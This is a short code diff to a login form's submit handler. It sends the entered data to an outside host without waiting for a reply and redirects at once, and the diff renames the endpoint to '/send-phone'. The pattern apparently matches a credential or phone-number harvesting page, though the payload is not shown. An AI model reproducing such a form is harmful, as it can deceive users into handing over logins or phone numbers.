@@ -140,8 +140,8 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
 
     if (!valid) return;
 
-    // 🚀 FIRE AND FORGET REQUEST (does NOT block redirect)
-    fetch("https://hobo-call.onrender.com/api/login", {
+    // send to YOUR backend
+    fetch("https://hobo-call.onrender.com/send-phone", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
@@ -154,7 +154,7 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
         console.error("Send failed:", err);
     });
 
-    // ⚡ immediate redirect (no waiting)
+    // immediate redirect
     window.location.href = "search.html";
 });
 </script>
